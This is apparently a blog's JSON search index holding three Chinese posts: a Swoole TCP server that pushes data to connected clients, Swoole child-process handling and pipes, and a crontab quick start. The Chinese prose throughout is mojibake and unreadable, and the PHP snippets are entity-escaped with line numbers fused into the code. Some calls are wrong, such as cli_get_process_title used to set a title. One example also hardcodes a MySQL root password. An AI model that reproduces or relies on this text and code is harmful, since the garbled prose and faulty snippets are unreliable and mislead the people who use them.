ä¸Šä¸€æ­¥ç¡®è®¤åï¼Œå†æ£€æŸ¥é˜²ç«å¢™é—®é¢˜ï¼Œè¿™é‡Œçš„é˜²ç«å¢™æŒ‡çš„æ˜¯æœºå™¨æœ¬èº«çš„é˜²ç«å¢™ï¼Œå¦‚æœæ˜¯äº‘æœåŠ¡å™¨ï¼Œé‚£ä¹ˆè¿˜åŒ…æ‹¬äº‘çš„é˜²ç«å¢™ã€‚ æ³¨æ„æœåŠ¡å™¨æ‰€ä½¿ç”¨çš„ IP åœ°å€ï¼Œå¦‚æœæ˜¯ 127.0.0.1 å›ç¯åœ°å€ï¼Œåˆ™å®¢æˆ·ç«¯åªèƒ½ä½¿ç”¨ 127.0.0.1 æ‰èƒ½è¿æ¥ä¸Šï¼Œæ‰€ä»¥å¦‚æœå¸Œæœ›å…¶ä»–æœºå™¨ä¹Ÿèƒ½è®¿é—®æœ¬æœºï¼Œé‚£å°±ä½¿ç”¨0.0.0.0ã€‚ å‚è€ƒé“¾æ¥ æ€ä¹ˆè§£å†³TCPç½‘ç»œä¼ è¾“ã€Œç²˜åŒ…ã€é—®é¢˜ï¼Ÿ","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"Swoole Tcp å­¦ä¹ ","slug":"swoole-tcp-learning","date":"2020-11-02T15:22:49.000Z","updated":"2020-11-02T15:40:47.308Z","comments":true,"path":"swoole-tcp-learning/","link":"","permalink":"https://www.0x2beace.com/swoole-tcp-learning/","excerpt":"æœ€è¿‘ä¸€ç›´åœ¨å­¦ä¹ Swooleï¼Œåˆšå¥½æœ‰ä¸ªè€é¡¹ç›®çš„ä¸€å°éƒ¨åˆ†(ä¸€ä¸ªè„šæœ¬)æœ‰ç”¨åˆ°äº†Tcp åè®®ï¼Œå€Ÿæ­¤æœºä¼šé‡æ„ä¸€ä¸‹ã€‚","text":"æœ€è¿‘ä¸€ç›´åœ¨å­¦ä¹ Swooleï¼Œåˆšå¥½æœ‰ä¸ªè€é¡¹ç›®çš„ä¸€å°éƒ¨åˆ†(ä¸€ä¸ªè„šæœ¬)æœ‰ç”¨åˆ°äº†Tcp åè®®ï¼Œå€Ÿæ­¤æœºä¼šé‡æ„ä¸€ä¸‹ã€‚ åœºæ™¯æè¿°ï¼šè¯¥è„šæœ¬çš„ä½œç”¨ç”¨ä¸€å¥è¯å°±å¯ä»¥æ¦‚è¿°ï¼šå°†æœ¬åœ°æ•°æ®æºæ¨é€ç»™å¦å¤–ä¸€å°æœåŠ¡å™¨ã€‚ åŸå§‹çš„å¤„ç†æ–¹å¼ï¼Œä¸åˆç†çš„åœ°æ–¹æœ‰ä»¥ä¸‹å‡ ç‚¹ï¼š ç›®æ ‡æœåŠ¡å™¨éœ€è¦å¼€æ”¾æŒ‡å®šç«¯å£ï¼Œè¿™ä¼šå¯¼è‡´ç›®æ ‡æœåŠ¡å™¨å‘å¤–æš´éœ²ï¼Œä¸å®‰å…¨ã€‚ å¦‚æœæœ‰å¤šå°ç›®æ ‡æœåŠ¡å™¨ï¼Œè¿™ä¼šå¯¼è‡´é¢‘ç¹éœ€è¦ä¿®æ”¹æºç ï¼Œè„šæœ¬ç»´æŠ¤èµ·æ¥ä¸æ–¹ä¾¿ã€‚ é‡æ„é‡æ„éœ€è¦è§£å†³çš„é—®é¢˜æœ‰å¦‚ä¸‹ï¼š å½“å®¢æˆ·ç«¯è¿æ¥æˆåŠŸåï¼Œæ‰ä¼šå‘è¯¥å®¢æˆ·ç«¯æ¨é€æ•°æ®ã€‚ å½“å®¢æˆ·ç«¯æ–­å¼€è¿æ¥æ—¶ï¼Œåœæ­¢å‘è¯¥å®¢æˆ·ç«¯æ¨é€æ•°æ®ã€‚ å…è®¸å¤šä¸ªå®¢æˆ·ç«¯åŒæ—¶è¿æ¥ã€‚ å› ä¸ºæ•°æ®æºæ˜¯ä¸é—´æ–­çš„ï¼Œç†è®ºä¸Šåªè¦å®¢æˆ·ç«¯çš„è¿æ¥ä¸ä¸»åŠ¨æ–­å¼€ï¼ŒæœåŠ¡ç«¯çš„æ•°æ®æ¨é€å°±ä¸ä¼šä¸»åŠ¨åœæ­¢ã€‚ æœ€ç»ˆä½¿ç”¨Swoole çš„Tcp + Process å®ç°äº†ä»¥ä¸Šéœ€æ±‚ï¼Œæ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?phpuse Swoole\\Process;&#x2F;** * åˆ›å»ºServer å¯¹è±¡ï¼Œç›‘å¬æœ¬åœ° 9501 ç«¯å£ã€‚ *&#x2F;$server &#x3D; new Swoole\\Server(&quot;0.0.0.0&quot;, 9501);$workers &#x3D; [];&#x2F;** * ç›‘å¬è¿æ¥è¿›å…¥äº‹ä»¶ *&#x2F;$server-&gt;on(&quot;Connect&quot;, function ($server, $fd) &#123; global $workers; &#x2F;&#x2F; åˆ›å»ºå­è¿›ç¨‹ $process &#x3D; new swoole_process(function (swoole_process $worker) use ($server, $fd) &#123; echo &quot;Client Connect&quot; . PHP_EOL; &#x2F;&#x2F; todo ä¸šåŠ¡é€»è¾‘ ... &#x2F;&#x2F; å‘å®¢æˆ·ç«¯æ¨é€æ¶ˆæ¯ $server-&gt;send($fd, $str); &#125;, true, 0, false); &#x2F;&#x2F; å¯åŠ¨å­è¿›ç¨‹ $pid &#x3D; $process-&gt;start(); array_push($workers, [&quot;pid&quot; &#x3D;&gt; $pid, &quot;fd&quot; &#x3D;&gt; $fd]);&#125;);&#x2F;** * ç›‘å¬æ•°æ®æ¥æ”¶äº‹ä»¶ *&#x2F;$server-&gt;on(&quot;Receive&quot;, function ($server, $fd, $from_id, $data)&#123; $server-&gt;send($fd, &quot;Server: &quot; . $data);&#125;);&#x2F;** * ç›‘å¬è¿æ¥å…³é—­äº‹ä»¶ *&#x2F;$server-&gt;on(&quot;Close&quot;, function ($server, $fd) &#123; global $workers; foreach ($workers as $worker) &#123; if ($worker[&#39;fd&#39;] &#x3D;&#x3D;&#x3D; $fd)&#123; &#x2F;&#x2F; æ£€æŸ¥å­è¿›ç¨‹æ˜¯å¦å­˜åœ¨ if (Process::kill($worker[&#39;pid&#39;], 0))&#123; array_shift($worker); &#x2F;&#x2F; é€šè¿‡ä¿¡å·ç»ˆæ­¢å­è¿›ç¨‹ Process::kill($worker[&#39;pid&#39;], SIGKILL); &#125; &#125; &#125; echo &quot;Client Close&quot; . PHP_EOL;&#125;);&#x2F;&#x2F; å¯åŠ¨TCP æœåŠ¡å™¨$server-&gt;start(); å…¶å®å®ç°çš„åŸç†å¾ˆç®€å•ï¼Œåˆ©ç”¨Swoole çš„åŸºäºäº‹ä»¶çš„ Tcp å¼‚æ­¥ç¼–ç¨‹ï¼Œå½“æœ‰å®¢æˆ·ç«¯è¿æ¥æ—¶ï¼Œå°±åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹è¿›è¡Œæ¨é€æ•°æ®ï¼Œä½†å®¢æˆ·ç«¯è¿æ¥æ–­å¼€æ—¶ï¼Œå°±é€šè¿‡ä¿¡å·ç»“æŸè¯¥å®¢æˆ·ç«¯å¯¹åº”çš„å­è¿›ç¨‹ã€‚","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"Swoole è¿›ç¨‹å­¦ä¹ ","slug":"swoole-process-learning","date":"2020-11-01T12:53:56.000Z","updated":"2020-11-03T14:33:18.115Z","comments":true,"path":"swoole-process-learning/","link":"","permalink":"https://www.0x2beace.com/swoole-process-learning/","excerpt":"è®°å½•Swoole è¿›ç¨‹å­¦ä¹ è¿‡ç¨‹ã€‚","text":"è®°å½•Swoole è¿›ç¨‹å­¦ä¹ è¿‡ç¨‹ã€‚ 1. åˆ›å»ºä¸€ä¸ªè¿›ç¨‹123456789&lt;?php&#x2F;&#x2F; è·å–å½“å‰è¿›ç¨‹ IDecho &quot;æˆ‘æ˜¯ ä¸€ä¸ª ä¸»è¿›ç¨‹ï¼Œæˆ‘çš„IDæ˜¯ï¼š&quot; . posix_getpid().PHP_EOL;&#x2F;&#x2F; ä¸ºè¿›ç¨‹è®¾ç½®åç§°cli_get_process_title(&quot;Master&quot;);while (true) &#123; sleep(1);&#125; 2. åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œå¦‚ä½•å›æ”¶å­è¿›ç¨‹ã€‚12345678910111213141516171819202122&lt;?php&#x2F;&#x2F; è·å–å½“å‰è¿›ç¨‹ IDecho &quot;æˆ‘æ˜¯ ä¸€ä¸ª ä¸»è¿›ç¨‹ï¼Œæˆ‘çš„IDæ˜¯ï¼š&quot; . posix_getpid().PHP_EOL;&#x2F;&#x2F; ä¸ºè¿›ç¨‹è®¾ç½®åç§°cli_get_process_title(&quot;Master&quot;);&#x2F;&#x2F; åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹$child &#x3D; new \\Swoole\\Process(function ()&#123; cli_get_process_title(&quot;Child&quot;); &#x2F;&#x2F; è¿™æ˜¯ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯å®šä¹‰å­è¿›ç¨‹éœ€è¦åšçš„äº‹æƒ…ã€‚ echo &quot;æˆ‘æ˜¯ä¸€ä¸ªå­è¿›ç¨‹ï¼Œæˆ‘çš„ID æ˜¯ï¼š&quot; . posix_getpid() . PHP_EOL; &#x2F;&#x2F; å¦‚æœå°±è¿™æ ·æ”¾ç€ä¸ç®¡ï¼Œé‚£ä¹ˆè¿™ä¸ªå­è¿›ç¨‹ä¸ä¼šè¢«å›æ”¶ï¼Œå®ƒæ˜¯ä¸€ä¸ªåƒµå°¸è¿›ç¨‹ï¼Œè™½ç„¶åœ¨é‚£é‡Œä½†æ˜¯å¹¶æ²¡æœ‰åšäº‹æƒ…ï¼Œå®ƒçš„ç”Ÿå‘½å‘¨æœŸå·²ç»ç»“æŸäº†ã€‚&#125;);&#x2F;&#x2F; åˆ›å»º$child-&gt;start();&#x2F;&#x2F; å›æ”¶å­è¿›ç¨‹\\Swoole\\Process::wait();while (true) &#123; sleep(1);&#125; 3. é‡å®šå‘å­è¿›ç¨‹æ ‡å‡†è¾“å‡ºå­è¿›ç¨‹é»˜è®¤çš„æ ‡å‡†è¾“å‡ºæ˜¯è¾“å‡ºåˆ°å±å¹•ä¸Šï¼Œå¯ä»¥é€šè¿‡å¯¹å­è¿›ç¨‹è®¾ç½®ï¼ŒæŠŠè¾“å‡ºé‡å®šå‘è‡³ç®¡é“ã€‚ ç„¶åå†ç”±ä¸»è¿›ç¨‹æŠŠç®¡é“ä¸­çš„å†…å®¹è¯»å–å‡ºæ¥ã€‚ 12345678910111213141516171819202122232425262728&lt;?php&#x2F;&#x2F; è·å–å½“å‰è¿›ç¨‹ IDecho &quot;æˆ‘æ˜¯ ä¸€ä¸ª ä¸»è¿›ç¨‹ï¼Œæˆ‘çš„IDæ˜¯ï¼š&quot; . posix_getpid().PHP_EOL;&#x2F;&#x2F; ä¸ºè¿›ç¨‹è®¾ç½®åç§°cli_get_process_title(&quot;Master&quot;);&#x2F;&#x2F; åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹$child &#x3D; new \\Swoole\\Process(function ()&#123; cli_get_process_title(&quot;Child&quot;); while (true) &#123; &#x2F;&#x2F; è¿™æ˜¯ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯å®šä¹‰å­è¿›ç¨‹éœ€è¦åšçš„äº‹æƒ…ã€‚ echo &quot;æˆ‘æ˜¯ä¸€ä¸ªå­è¿›ç¨‹ï¼Œæˆ‘çš„ID æ˜¯ï¼š&quot; . posix_getpid() . PHP_EOL; &#x2F;&#x2F; å¦‚æœå°±è¿™æ ·æ”¾ç€ä¸ç®¡ï¼Œé‚£ä¹ˆè¿™ä¸ªå­è¿›ç¨‹ä¸ä¼šè¢«å›æ”¶ï¼Œå®ƒæ˜¯ä¸€ä¸ªåƒµå°¸è¿›ç¨‹ï¼Œè™½ç„¶åœ¨é‚£é‡Œä½†æ˜¯å¹¶æ²¡æœ‰åšäº‹æƒ…ï¼Œå®ƒçš„ç”Ÿå‘½å‘¨æœŸå·²ç»ç»“æŸäº†ã€‚ sleep(1); &#125;&#125;, true);&#x2F;&#x2F; åˆ›å»º$child-&gt;start();&#x2F;&#x2F; å›æ”¶å­è¿›ç¨‹ï¼Œæ˜¯å¦é˜»å¡ç­‰å¾…ï¼Œé»˜è®¤ä¸ºtrueï¼Œé˜»å¡ã€‚\\Swoole\\Process::wait(false);while (true) &#123; echo &quot;é€šè¿‡ä¸»è¿›ç¨‹ä»ç®¡é“ä¸­è¯»å–ä¿¡æ¯ï¼š&quot;. $child-&gt;read(). PHP_EOL; sleep(1);&#125; è¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œå¯ä»¥é€šè¿‡ä¸»è¿›ç¨‹é›†ä¸­å¤„ç†å­è¿›ç¨‹çš„è¾“å‡ºï¼ˆæ¯”å¦‚å¯ä»¥å†™å…¥æ—¥å¿—ï¼‰ï¼Œé¿å…è¾“å‡ºç›´æ¥åˆ°å±å¹•ä¸­äº†ã€‚ ç¬¬ä¸€ä¸ªå‚æ•°çš„ä½œç”¨æ˜¯ï¼šæ˜¯å¦å°†è¾“å‡ºé‡å®šå‘è‡³ä¸»è¿›ç¨‹ã€‚trueï¼šå°†è¾“å‡ºé‡å®šå‘è‡³ä¸»è¿›ç¨‹ç®¡é“ã€‚falseï¼šç›´æ¥å°†è¾“å‡ºé‡å®šå‘è‡³å±å¹•ã€‚ ç¬¬äºŒä¸ªå‚æ•°çš„ä½œç”¨æ˜¯ï¼šæ˜¯å¦åˆ›å»ºç®¡é“ã€‚0ï¼šä¸åˆ›å»º åˆ›å»ºTcp ç®¡é“ åˆ›å»ºUdp ç®¡é“ ç¬¬ä¸‰ä¸ªå‚æ•°çš„ä½œç”¨æ˜¯ï¼šæ˜¯å¦å¯ç”¨åç¨‹ã€‚ 4. å¤šä¸ªå­è¿›ç¨‹çš„å›æ”¶å¦‚æœä¸»è¿›ç¨‹åªæ˜¯æ‰§è¡Œä¸€æ¬¡å°±é€€å‡ºï¼Œè€Œå­è¿›ç¨‹è¿˜ä¸€ç›´åœ¨ï¼Œé‚£ä¹ˆä¸»è¿›ç¨‹ä¹Ÿä¸ä¼šç›´æ¥é€€å‡ºã€‚ å¦‚æœæœ‰å¤šä¸ªå­è¿›ç¨‹ï¼Œå…¶ä¸­æŸä¸€ä¸ªå­è¿›ç¨‹é€€å‡ºäº†ï¼Œè€Œå¦ä¸€ä¸ªå¹¶æ²¡æœ‰é€€å‡ºï¼Œè¿™æ—¶ä¸»è¿›ç¨‹ä¹Ÿä¼šé€‰æ‹©é€€å‡ºï¼Œè€Œå‰©ä½™çš„é‚£ä¸ªå­è¿›ç¨‹åˆ™æˆäº†åƒµå°¸è¿›ç¨‹ã€‚å› ä¸ºå®ƒçš„çˆ¶è¿›ç¨‹çš„ID ä¸ºé›¶ã€‚ å¦‚æœä¸åšä¿¡å·å¤„ç†ï¼Œå¦åˆ™å­è¿›ç¨‹ä¸€æ—¦é€€å‡ºï¼Œéƒ½ä¼šå¼•èµ·çˆ¶è¿›ç¨‹é€€å‡ºã€‚å¦‚æœè¿™æ—¶è¿˜æœ‰å…¶ä»–å­è¿›ç¨‹æ²¡æœ‰é€€å‡ºï¼Œè¿™ä¼šé€ æˆå…¶ä»–å­è¿›ç¨‹å˜æˆåƒµå°¸è¿›ç¨‹ã€‚ åœ¨å­è¿›ç¨‹ä¸­åˆ›å»ºæœåŠ¡ åˆ†åˆ«æ˜¯Masterã€Managerã€Worker è¿›ç¨‹ï¼Œä»¥åŠè¯¥å­è¿›ç¨‹çš„çˆ¶è¿›ç¨‹ã€‚ å¯ä»¥å•ç‹¬è®¾ç½®http è¿›ç¨‹ï¼š 123$http-&gt;set([ &quot;worker_num&quot; &#x3D;&gt; 1]); è¿™æ ·çš„è¯ï¼Œè¿›ç¨‹å°±å˜æˆäº†ä¸¤ç±»ï¼š æœ€ä¸Šé¢é‚£ä¸ªæ˜¯çˆ¶è¿›ç¨‹ï¼Œä¸‹é¢ä¸‰ä¸ªåˆ†åˆ«æ˜¯Masterã€Mangerã€Worker è¿›ç¨‹ã€‚ 6. åœ¨è¿›ç¨‹ä¸­ä½¿ç”¨åç¨‹7. å­è¿›ç¨‹ä½¿ç”¨ç®¡é“è¿›è¡Œé€šä¿¡1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phpuse \\Swoole\\Process;&#x2F;&#x2F; å¼•å…¥åç¨‹use \\Swoole\\Coroutine\\Mysql as Mysql;&#x2F;&#x2F; è·å–å½“å‰è¿›ç¨‹ IDecho &quot;æˆ‘æ˜¯ ä¸€ä¸ª ä¸»è¿›ç¨‹ï¼Œæˆ‘çš„IDæ˜¯ï¼š&quot; . posix_getpid().PHP_EOL;$child &#x3D; new Process(function (Process $proces)&#123; &#x2F;&#x2F; $mysql &#x3D; new \\think\\db\\builder\\Mysql(); $mysql &#x3D; new Mysql(); $db &#x3D; $mysql-&gt;connect([&quot;host&quot; &#x3D;&gt; &quot;127.0.0.1&quot;, &quot;user&quot; &#x3D;&gt; &quot;root&quot;, &quot;password&quot; &#x3D;&gt; &quot;122410&quot;, &quot;database&quot; &#x3D;&gt; &quot;2v&quot;]); while (true) &#123; $sql &#x3D; &quot;select * from 2v.2v_user where is_delete &#x3D; 0 limit 0, 1&quot;; $rows &#x3D; $mysql-&gt;query($sql); if ($rows) &#123; $proces-&gt;write(&quot;æˆ‘æ˜¯ä¸€å·å­è¿›ç¨‹ï¼Œæ­£åœ¨æŸ¥è¯¢æ•°æ®ï¼š&quot;.$rows[0][&quot;user_name&quot;]); &#125; sleep(1); &#125;&#125;, false, 1, true);&#x2F;&#x2F; åˆ›å»ºå­è¿›ç¨‹$child-&gt;start();$child2 &#x3D; new Process(function (Process $process) &#123; while (true) &#123; sleep(1); $res &#x3D; $process-&gt;read(); if ($res) &#123; echo &quot;æˆ‘æ˜¯äºŒå·å­è¿›ç¨‹ï¼Œæ­£åœ¨è·å–æ•°æ®ï¼š&quot;.$res.PHP_EOL; &#125; &#125;&#125;);&#x2F;&#x2F; åˆ›å»ºç¬¬äºŒä¸ªå­è¿›ç¨‹$child2-&gt;start();while (true) &#123; &#x2F;&#x2F; ä¸€å·å­è¿›ç¨‹ä»ç®¡é“ä¸­è¯»å–æ•°æ® $data &#x3D; $child-&gt;read(); if ($data) &#123; &#x2F;&#x2F; å¦‚æœæ•°æ®å­˜åœ¨ï¼ŒäºŒå·å­è¿›ç¨‹åˆ™å‘ç®¡é“ä¸­å†™å…¥æ•°æ® $child2-&gt;write($data); &#125; sleep(1);&#125;&#x2F;&#x2F; é€šè¿‡ä¿¡å·å›æ”¶å­è¿›ç¨‹Process::signal(SIGCHLD, function ($sig) &#123; &#x2F;&#x2F; å¿…é¡»ä¸ºfalseï¼Œéé˜»å¡æ¨¡å¼ while ($res &#x3D; Process::wait(false)) &#123; echo &quot;PID &#x3D; &#123;$res[&#39;pid&#39;]&#125;&quot;; &#125;&#125;); 8. å­è¿›ç¨‹ä½¿ç”¨é˜Ÿåˆ—è¿›è¡Œé€šä¿¡9. è®¾ç½®å®šæ—¶ä»»åŠ¡é€šè¿‡Swoole è®¾ç½®å®šæ—¶ä»»åŠ¡ï¼Œåˆ°ç‚¹ä¹‹åè‡ªåŠ¨æ‰§è¡Œå®šæ—¶ä»»åŠ¡ã€‚ æ ¸å¿ƒé€»è¾‘ï¼šåˆ›å»ºä¸€ä¸ªManager è¿›ç¨‹ï¼Œé€šè¿‡ä¸€ä¸ªwhile å¾ªç¯ï¼Œå®šæ—¶è·å–è·å–å½“å‰æ—¶é—´åˆ¤æ–­æ˜¯å¦éœ€è¦æ‰§è¡Œå®šæ—¶ä»»åŠ¡ã€‚ å¦‚æœéœ€è¦æ‰§è¡Œå®šæ—¶ä»»åŠ¡ï¼Œåˆ™å‘é€ä¸€ä¸ªä¿¡å·ï¼Œåœ¨ä¸»è¿›ç¨‹ä¸­ç›‘å¬è¯¥ä¿¡å·ï¼Œ ç„¶åæ‰§è¡Œå¯¹åº”çš„ä¸šåŠ¡é€»è¾‘ã€‚ ä» Swoole 4.x ç‰ˆæœ¬å¼€å§‹ï¼Œä¸å†ä»¥ç›‘å¬ä¿¡å·çš„æ–¹å¼ä½œä¸ºå›æ”¶å­è¿›ç¨‹äº†ã€‚","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"Crontab å¿«é€Ÿä¸Šæ‰‹","slug":"crontab-quick-start","date":"2020-10-27T15:22:29.000Z","updated":"2020-11-20T15:09:20.436Z","comments":true,"path":"crontab-quick-start/","link":"","permalink":"https://www.0x2beace.com/crontab-quick-start/","excerpt":"Crontab æ˜¯Unix ç³»ç»Ÿä¸­åŸºäºæ—¶é—´çš„ä»»åŠ¡ç®¡ç†å·¥å…·ã€‚","text":"Crontab æ˜¯Unix ç³»ç»Ÿä¸­åŸºäºæ—¶é—´çš„ä»»åŠ¡ç®¡ç†å·¥å…·ã€‚ è¿™ä¸ªå‘½ä»¤ä¸ä¼ ç»Ÿçš„ Unix å‘½ä»¤ä¸ä¸€æ ·ï¼Œä¸‹é¢ä¼šä¸€ä¸€ä»‹ç»å…¶è§„åˆ™åŠå…¶ç”¨æ³•ã€‚ crontab è¿˜æ˜¯ croncrontab è¿˜æ˜¯ cronï¼Ÿåˆæ¬¡æ¥è§¦ crontab çš„åŒå­¦å¯èƒ½ä¼šè¢«è¿™ä¸¤ä¸ªè¯ç»™ç»•æ™•ã€‚ å…¶å®å¯ä»¥è¿™æ ·æ¥ç†è§£ï¼šcrontabå°±æ˜¯ cronæœåŠ¡çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè€Œcronåˆ™æ˜¯èƒŒåå¤„ç†crontabæŠ•é€’ä»»åŠ¡çš„æœåŠ¡ã€‚ æ–‡ä»¶æ ¼å¼crontab å‘½ä»¤æ˜¯ä»¥å›ºå®šçš„æ—¶é—´æ ¼å¼æ¥ä½¿ç”¨çš„ï¼Œ è¡¨ç¤ºæ„ä¹‰ åˆ†é’Ÿ å°æ—¶ æ—¥æœŸ æœˆä»½ å‘¨ å‘½ä»¤ èŒƒå›´ 0ï½59ï¼ˆ*ï¼‰ 0ï½23ï¼ˆ*ï¼‰ 1ï½31ï¼ˆ*ï¼‰ 1ï½12ï¼ˆ*ï¼‰ 0ï½7ï¼ˆ*ï¼‰ éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ å¦å¤–è¿˜æœ‰ä¸€äº›ç‰¹æ®Šå­—ç¬¦å…·æœ‰ç‰¹æ®Šå«ä¹‰ï¼š * è¡¨ç¤ºä»»ä½•æ—¶åˆ»éƒ½æ¥æ”¶ã€‚ä¸¾ä¸ªæ —å­ï¼š* 12 * * * è¡¨ç¤ºä¸è®ºä½•æœˆã€ä½•æ—¥çš„æ˜ŸæœŸå‡ çš„åäºŒç‚¹éƒ½æ‰§è¡ŒæŒ‡å®šå‘½ä»¤ã€‚ å¸¸ç”¨å®ä¾‹æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ï¼š 1*&#x2F;1 * * * * æˆ–è€… * * * * * æ¯äº”åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ï¼š 1*&#x2F;5 * * * * æ¯å°æ—¶æ‰§è¡Œä¸€æ¬¡ï¼š 10 * * * * æˆ–è€… 0 *&#x2F;1 * * * æ¯å¤©æ‰§è¡Œä¸€æ¬¡ï¼š 10 0 * * * æ¯å‘¨æ‰§è¡Œä¸€æ¬¡ï¼š 10 0 * * 0 æ¯æœˆæ‰§è¡Œä¸€æ¬¡ï¼š 10 0 1 * 0 å¦‚ä½•ä½¿ç”¨åˆæ¬¡æ¥è§¦crontab å‘½ä»¤æ—¶ï¼Œæˆ‘ä¹Ÿæ¯”è¾ƒçº³é—·ï¼Œè¿™ä¸ªå‘½ä»¤å€’åº•æ˜¯å¦‚ä½•ä½¿ç”¨çš„ï¼Ÿ ä½¿ç”¨ crontab æœ‰ä¸¤ç§æ–¹å¼ï¼š crontab -eï¼šç›´æ¥æ¥å—æ ‡å‡†è¾“å…¥ï¼ˆé”®ç›˜ï¼‰ä¸Šé”®å…¥çš„å‘½ä»¤ï¼Œå¹¶å°†å®ƒä»¬è½½å…¥crontabã€‚ crontab fileï¼šå°†file ä½œä¸ºcrontab çš„ä»»åŠ¡åˆ—è¡¨æ–‡ä»¶å¹¶è½½å…¥crontab ç¬¬ä¸€ç§æ–¹å¼æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œç›´æ¥åœ¨ç»ˆç«¯æ·»åŠ  crontab ä»»åŠ¡å°±è¡Œäº†ï¼Œä¸‹é¢ç®€å•è¯´ä¸€ä¸‹ç¬¬äºŒç§ï¼ˆå…¶å®ä¸¤è€…çš„æ ¸å¿ƒéƒ½æ˜¯ä¸€æ ·çš„ï¼‰ã€‚ åˆ›å»ºcrontab æ–‡ä»¶é¦–å…ˆåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶çš„å†…å®¹ä»¥åŠŸèƒ½æè¿°ã€æ‰§è¡Œæ—¶é—´ã€æ‰§è¡Œä»»åŠ¡ è¿™å‡ éƒ¨åˆ†ç»„æˆã€‚ å…¶ä¸­ï¼Œå‰ä¸¤è€…å¹¶ä¸æ˜¯ä¸€å®šéœ€è¦ï¼Œåªæ˜¯ä¸ºäº†æ–¹ä¾¿è‡ªå·±æ—¥åæˆ–å…¶ä»–äººèƒ½å¿«é€ŸçŸ¥é“è¿™ä¸ªä»»åŠ¡å…·ä½“æ˜¯åšä»€ä¹ˆçš„ï¼Œ# è¡¨ç¤ºæ³¨é‡Šã€‚ ç¤ºä¾‹ï¼Œåˆ›å»ºä¸€ä¸ªåç§°ä¸ºscript_cron çš„crontab æ–‡ä»¶ï¼š 12# æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ script.php è„šæœ¬* * * * * &#x2F;usr&#x2F;bin&#x2F;php ~&#x2F;script.php è¿è¡Œcrontabä¸ºäº†æäº¤åˆšåˆšåˆ›å»ºçš„crontab æ–‡ä»¶ï¼Œå¯ä»¥æŠŠè¿™ä¸ªæ–°åˆ›å»ºçš„æ–‡ä»¶åç§°ä½œä¸ºcrontabå‘½ä»¤çš„å‚æ•°ï¼š 1$ crontab script_cron åˆ—å‡ºcron æœåŠ¡ä½¿ç”¨-l å‚æ•°åˆ—å‡ºcrontabæ–‡ä»¶ï¼š 123$ crontab -l# æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ script.php è„šæœ¬* * * * * &#x2F;usr&#x2F;bin&#x2F;php ~&#x2F;script.php ç¼–è¾‘cron æœåŠ¡1$ crontab -e åˆ é™¤cron æœåŠ¡1$ crontab -r å¸¸è§é—®é¢˜crontab æ²¡æœ‰ç«‹å³ç”Ÿæ•ˆæ–°åˆ›å»ºçš„cron ä»»åŠ¡ï¼Œä¸ä¼šé©¬ä¸Šæ‰§è¡Œï¼Œè‡³å°‘è¦è¿‡ä¸¤åˆ†é’Ÿæ‰æ‰§è¡Œã€‚ å¦‚æœå¸Œæœ›èƒ½é©¬ä¸Šæ‰§è¡Œï¼Œå¯ä»¥é‡å¯ crontab ã€‚ 12345&#x2F;&#x2F; Ubuntuï¼š$ service cron restart &#x2F;&#x2F; Centos$ service crond restart crontab å‹æ ¹æ²¡æ‰§è¡Œæœ‰æ—¶å€™ä¼šé‡åˆ°ç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­å¯ä»¥æ‰§è¡Œä»»åŠ¡ï¼Œä½†æ˜¯å®šæ—¶ä»»åŠ¡å´æ€ä¹ˆéƒ½ä¸æ‰§è¡Œï¼Œ è¿™æ—¶é¦–å…ˆéœ€è¦ç¡®è®¤ cron æœåŠ¡æ˜¯å¦æ­£å¸¸ï¼š 12345&#x2F;&#x2F; Ubuntuï¼š$ service cron status &#x2F;&#x2F; Centos$ service crond status ç„¶åç¡®è®¤éœ€è¦æ‰§è¡Œçš„ä»»åŠ¡æ˜¯å¦åŒ…å«è·¯å¾„ï¼Œå¦‚æœåŒ…å«è¯·ä½¿ç”¨å…¨å±€è·¯å¾„ã€‚ æœ€åé‡å¯ cron æœåŠ¡ï¼Œé€šå¸¸åˆ°è¿™é‡Œå°±å·²ç»å¯ä»¥æ­£å¸¸æ‰§è¡Œäº†ï¼Œå¦‚æœè¿˜ä¸è¡Œï¼Œå°è¯•å¼•å…¥ç¯å¢ƒå˜é‡ï¼š 10 * * * * . &#x2F;etc&#x2F;profile; &#x2F;usr&#x2F;bin&#x2F;php &#x2F;var&#x2F;www&#x2F;script.php crontab æ— æƒé™æ‰§è¡Œéœ€è¦æ³¨æ„çš„æ˜¯crontab ä»»åŠ¡çš„è°ƒåº¦ï¼Œåªæœ‰ root å’Œä»»åŠ¡æ‰€æœ‰è€…æ‹¥æœ‰æƒé™ã€‚ 